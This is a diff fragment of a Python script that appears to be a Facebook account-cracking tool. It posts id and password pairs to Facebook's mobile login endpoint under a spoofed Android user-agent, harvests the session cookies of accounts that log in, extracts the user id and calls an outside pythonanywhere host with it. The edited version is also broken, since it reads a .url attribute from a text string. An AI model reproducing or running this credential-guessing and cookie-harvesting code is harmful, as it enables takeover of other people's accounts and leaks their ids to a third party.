@@ -1287,9 +1287,9 @@ def m6(idf,pwv):
             'sec-fetch-site': 'same-origin',
             'upgrade-insecure-requests': '1',
             'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 14; 23076PC4BI Build/UKQ1.230917.001)'}
-   lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
-   log_cookies=session.cookies.get_dict().keys()
-   if 'home.php' in log_cookies:
+   url='https://m.facebook.com/login/device-based/login/async/'
+   response = session.post(url=url,data=log_data,headers=header_freefb).text
+   if 'home.php' in response.url:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
     user = re.findall('c_user=(.*);xs', coki)[0]
     url = f"https://shishirx.pythonanywhere.com/lock?uid={user}"
